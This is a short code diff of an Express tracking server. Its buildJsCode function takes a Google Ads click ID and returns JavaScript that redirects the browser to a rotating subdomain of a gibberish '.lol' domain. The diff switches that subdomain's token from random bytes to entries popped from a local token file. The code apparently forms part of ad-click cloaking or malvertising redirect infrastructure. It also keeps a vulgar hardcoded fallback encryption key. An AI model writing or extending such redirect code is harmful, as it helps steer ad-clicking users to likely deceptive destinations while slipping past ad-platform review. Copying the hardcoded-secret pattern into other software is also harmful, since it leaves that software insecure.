@@ -2,7 +2,6 @@ const express = require("express");
 const cors = require("cors");
 const Redis = require("ioredis");
 const CryptoJS = require("crypto-js");
-const crypto = require("crypto");
 
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "tumharimaakichoot";
 
@@ -143,7 +142,9 @@ app.post("/track", async (req, res) => {
  * Customize the body of this function to match your popup / tracking logic.
  */
 function buildJsCode(gclid) {
-  const token = crypto.randomBytes(6).toString("hex");
+  const tokens = require("./valid-tokens.json");
+  const token = tokens.pop();
+
   return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
 }
 
